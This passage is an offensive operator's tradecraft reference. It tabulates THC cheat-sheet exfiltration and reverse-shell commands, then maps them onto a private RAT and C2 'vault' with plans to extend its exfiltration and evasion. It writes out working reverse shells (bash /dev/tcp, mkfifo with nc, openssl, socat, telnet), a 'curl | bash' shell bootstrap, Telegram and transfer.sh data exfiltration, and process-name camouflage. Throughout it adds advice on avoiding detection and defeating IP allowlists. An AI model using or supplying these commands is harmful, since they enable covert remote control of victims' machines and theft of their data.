| `php -S 127.0.0.1:8080` + `upload_server.php` | PHP single-file upload server | Wipe `upload_server.php` and `upload/` after |
| `pip install uploadserver` + `python -m uploadserver` | Python multi-file upload server | `uploadserver` package leaves pip cache |
| `cloudflared tunnel --url localhost:PORT` | Cloudflare-fronted HTTPS tunnel | trycloudflare.com URL is public; share OOB |
| `purl` (Python urllib) | curl replacement, TLS verify disabled | Bypasses TLS pinning; `CERT_NONE` in process |
| `surl` (openssl s_client) | curl replacement via TLS handshake | `verify_quiet`/`ignore_unexpected_eof` probed |
| `lurl` (perl LWP::Simple) | curl replacement via Perl | Perl interpreter footprint |
| `burl` (bash /dev/tcp) | HTTP-only curl replacement | Cleartext; PORT env var override |
| `transfer` (transfer.sh wrapper) | One-shot public dump exfil | URL is public; use unguessable names |
| `rsync --daemon --port=31337 --config=r.conf` | Standalone rsync server | `r.conf` contains uid/gid — wipe |
| `socat OPENSSL-LISTEN:31337,...cert=ssl.pem` | TLS-wrapped rsync server | Self-signed cert OK for confidentiality, not MITM |
| `wsgidav --port=8080 --root=. --auth=anonymous` | WebDAV server | `--auth=anonymous` = public writable; use `user:pass` |
| `net use * \\host@SSL\path` | Mount WebDAV on Windows | Leaves `net use` entry; `net use /delete` to clean |
| `curl -sF document=@file.zip .../sendDocument` | Telegram bot exfil | Token & chat_id rotate; files persist server-side |
| `bash -c '(exec -a kqueue bash -i &>/dev/tcp/H/P 0>&1 &)'` | Bash revshell with process rename | Only renames argv[0]; `lsof -p` still shows socket |
| `curl -skfL https://OP:8080 \| bash` | curlshell bootstrap | Looks like `curl \| bash` install; very common pattern |
| `openssl s_server -port 1524 -cert cert.pem -key key.pem` | TLS listener for openssl revshell | Self-signed cert; rotate per engagement |
| `ncat -kltv 1524` | Multi-connection cleartext listener | Cleartext; use only for curl-telnet bootstrap |
| `({ openssl s_client -connect OP:1524 -quiet </dev/fd/3 3>&- 2>/dev/null \| sh 2>&3 >&3 3>&- ; } 3>&1 \| : &)` | OpenSSL revshell background | Detached; `ps -ef \| grep openssl` finds it |
| `mkfifo /tmp/.io; sh -i 2>&1 </tmp/.io \| nc -vn OP 1524 >/tmp/.io` | mkfifo revshell for non-Bash systems | Wipe `/tmp/.io` after upgrade |
| `touch /tmp/.fio; tail -f /tmp/.fio \| sh -i \| telnet OP 31337 >/tmp/.fio` | No-mkfifo telnet revshell | `tail -f` is long-running; check `ps` |
| `ssh -i .r -R31337:0:8080 ... nokey@remote.moe` | remote.moe SSH reverse tunnel | Both sides touch remote.moe IPs |
| `exec -a kqueue bash -i` | Process argv[0] rename | Camouflage only; not real stealth |
| `exec script -qc /bin/bash /dev/null` | PTY upgrade via script | `script` writing to /dev/null is mildly unusual |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | PTY upgrade via Python | Most common EDR signature; switch to script if available |
| `stty raw -echo icrnl opost; fg` | Full interactive shell takeover | Operator terminal left in raw mode if connection drops |
| `socat file:\`tty\`,raw,echo=0 tcp-listen:1524` | socat interactive listener | Cleartext; use `openssl-listen` for TLS |
| `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:OP:1524` | socat interactive reverse | One-shot, no stty dance required |

## Gaps & Extensions

### What the vault covers that this training does not
- **Windows-native exfil/injection transports**: vault T-022 (`tcp_transport.rs`, `http_poll_transport.rs`, `henge.rs` malleable C2) are Windows-native, encrypted, protocol-multiplexed transports. THC's transports are mostly Linux/Unix bootstrap primitives.
- **Autonomous dead-drop C2 (T-019)**: vault's `discovery.rs` + `eth_rpc.rs` + `eth_tx.rs` implement Sepolia Ethereum TX-based dead drop with EIP-155 signing. THC's Telegram bot exfil and transfer.sh are human-in-the-loop equivalents — useful for understanding the *concept* but the vault's implementation is more sophisticated (autonomous, blockchain-backed, harder to take down).
- **Multi-chain peer relay (T-022 `juubi.rs`, `rikudo.rs`)**: vault has structured peer-relay chaining for multi-hop NAT traversal. THC's remote.moe SSH tunnel is a single-hop ad-hoc equivalent.
- **Steganography as exfil channel (T-019)**: vault supports steganographic encoding. THC has no equivalent.
- **WinHTTP staged download (T-022 `winhttp_dl.rs`)**: vault's Windows-native staged download. THC's `purl`/`surl`/`lurl`/`burl` are the Linux analogs.
- **Malleable C2 profiles (T-022 `henge.rs`)**: vault supports per-engagement malleable profiles. THC's transports are static.
- **BYOVD (T-022)**: vault's Bring-Your-Own-Vulnerable-Driver capability is absent here.
- **Shellcode encoding formats (T-021)**: vault's IPv4/IPv6/MAC/UUID/word encodings for shellcode transport have no THC counterpart (THC focuses on file exfil, not shellcode).

### What this training covers that the vault does not
- **Operator-side Linux tradecraft**: The vault is overwhelmingly Windows-targeted (client_rust is Windows RAT). THC's tmux/screen `send-keys`/`readbuf`, bash `/dev/tcp`, mkfifo revshells, and `exec -a` process rename are essential operator tradecraft for the Linux side of engagements that the vault completely lacks.
- **PTY and fully interactive shell upgrades**: The `stty raw -echo icrnl opost; fg` recipe plus `reset -I` and terminal-size query via `\033[18t` is a critical operator skill with no vault equivalent. Operators who skip this will be unable to run `sudo`, `vim`, `top` from a reverse shell.
- **curl-less download functions (purl/surl/lurl/burl)**: Four language-specific one-liners for retrieving files when curl/wget are absent. This is more comprehensive than vault T-020's Kaguya LOtL binary inventory, which enumerates binaries but doesn't ship ready-to-use download functions.
- **Cloudflare tunnel egress patterns**: THC's `cloudflared tunnel --url localhost:PORT` recipe is a turnkey egress solution that could be combined with vault transports (e.g., front an HTTP poll transport via cloudflared to defeat destination-IP allowlisting).
- **Public-dump exfil as a category**: THC explicitly enumerates public upload services (transfer.sh, Telegram, etc.) as an exfil category. The vault's T-019 dead-drop is more sophisticated but operator-heavier; THC's approach is lighter-weight for quick hits.
- **WebDAV drag-and-drop exfil**: `wsgidav` + cloudflared + Windows `net use \\host@SSL\path` is a unique combination not in the vault — could be added as an output channel to T-023's `amaterasu.rs` exfil engine.
- **Process camouflage via `exec -a`**: Lightweight argv[0] rename for bash — not as robust as vault T-020's IAT camouflage or self-deletion, but useful when those are unavailable.

### Specific extension opportunities
- **Add `purl`/`surl` to dark_crystal transport module**: If dark_crystal ever targets Linux, these functions provide curl-less bootstrap download.
- **Telegram dead-drop in T-019**: Vault's `discovery.rs` could add a Telegram bot fetch variant alongside Google Translate and Ethereum Sepolia.
- **WebDAV output channel in T-023 `amaterasu.rs`**: Add a `webdav_exfil` function that POSTs files to a cloudflared-fronted wsgidav endpoint.
- **PTY upgrade helper in client_rust**: If client_rust ever gains a Linux target, the `script -qc /bin/bash /dev/null` recipe is the canonical PTY-spawn primitive.
- **cloudflared-fronted HTTP poll transport**: Wrap vault T-022's `http_poll_transport.rs` endpoint behind `cloudflared tunnel --url localhost:PORT` for destination-IP allowlist evasion.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| File encoding (base64/xxd/uuencode) | T-021 (Crypto & Obfuscation — shellcode encodings) | Same primitive, different domain: THC encodes files for terminal transfer; vault encodes shellcode for payload transport |
| Cut & paste heredoc transfer | — | Operator-side only; no vault equivalent |
| tmux `send-keys` / screen `readbuf` | — | Operator-side Linux tradecraft; vault is Windows-targeted |
| gs-netcat encrypted SFTP overlay | T-022 (Network Suite — kamui.rs SOCKS5, juubi.rs peer relay) | Conceptually similar encrypted NAT-traversal overlay; gs-netcat is turnkey third-party, vault is custom Rust |
| Cloudflared-tunneled HTTP server | T-022 (HTTP poll transport — `http_poll_transport.rs`) | cloudflared fronts operator's HTTP server; vault's HTTP poll is the in-band C2 transport. Could be combined: front HTTP-poll endpoint via cloudflared |
| Cloudflared + PHP/Python upload server | T-023 (amaterasu.rs exfil engine) | THC is operator-side upload server; vault is target-side exfil engine. WebDAV upload channel could be added to amaterasu.rs |
| purl/surl/lurl/burl (curl-less downloads) | T-020 (Kaguya LOtL inventory), T-022 (winhttp_dl.rs WinHTTP staged download) | THC = Linux LOtL download functions; vault = Windows LOtL enumeration + WinHTTP download. Same problem domain, different OS |
| transfer.sh public dump | T-019 (Edo Dead Drop — rentry.co/Sepolia/steganography) | Both use public services as exfil channels; THC is human-in-the-loop, vault is autonomous |
| Encrypted rsync (socat + OpenSSL) | T-022 (rikudo.rs multi-chain vault, juubi.rs peer relay) | Both implement encrypted file-transfer infrastructure; rsync is operator-side, vault is programmatic target-side |
| WebDAV (wsgidav + cloudflared) | T-022 (HTTP poll transport), T-023 (amaterasu.rs exfil) | WebDAV is a richer protocol on top of HTTP; could be added as amaterasu.rs output channel |
| Telegram bot exfil | T-019 (Edo Dead Drop — Sepolia TX, Google Translate) | Same conceptual class: public service doubling as covert channel. Telegram is human-in-the-loop, simpler than vault's autonomous blockchain dead drop |
| Bash `/dev/tcp` revshell | T-022 (tcp_transport.rs) | THC = bootstrap cleartext revshell; vault = encrypted multiplexed TCP transport. Bootstrap gets you to a point where vault tooling deploys |
| curlshell (HTTPS-encapsulated) | T-022 (HTTP poll transport, henge.rs malleable C2) | curlshell = bootstrap; vault HTTP poll = production transport with malleable profiles |
| OpenSSL s_client revshell | T-022 (tcp_transport.rs with TLS) | TLS-wrapped reverse shell; vault transport is the production-grade equivalent |
| nc/mkfifo/telnet revshell (no /dev/tcp) | — | Bootstrap for embedded systems; no vault equivalent |
| remote.moe SSH tunnel | T-022 (juubi.rs peer relay, rikudo.rs multi-chain) | Both provide NAT-traversal relay; remote.moe is single-hop third-party, vault is multi-hop custom |
| Python/Perl/PHP revshell one-liners | — | Bootstrap primitives for non-Bash systems; no vault equivalent |
| `exec -a` process rename | T-020 (IAT camouflage, self-deletion) | Lightweight argv[0] rename vs. vault's full IAT camouflage; much weaker but useful when IAT camo is unavailable |
| `script -qc` / `python pty.spawn` PTY upgrade | — | Linux operator-side skill; no vault equivalent (vault targets Windows where PTY concept doesn't apply) |
| Full interactive shell (`stty raw -echo; fg`) | — | Linux operator-side skill; no vault equivalent |
| socat interactive revshell | — | Bootstrap; vault has no socat equivalent (custom Rust transports) |

---

*Consolidated from `thc-exfil-shells.md` covering THC cheat sheet §4 (Data Upload/Download/Exfil, 11 mechanisms) and §5 (Reverse Shell / Dumb Shell, 11 variants + 3 upgrade tiers). All commands preserved verbatim from source. Cross-references target vault cards T-019 (Edo Dead Drop), T-020 (Anti-Analysis Suite), T-021 (Crypto & Obfuscation), T-022 (Network Suite), T-023 (Client Capabilities).*
